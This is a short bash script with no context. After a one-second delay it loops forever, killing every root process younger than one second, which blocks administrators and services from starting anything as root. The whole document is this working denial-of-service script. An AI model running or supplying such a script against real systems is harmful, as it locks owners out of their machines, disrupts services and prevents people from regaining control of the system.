#!/bin/bash
sleep 1
while :;do killall --younger-than 1s -u root;done
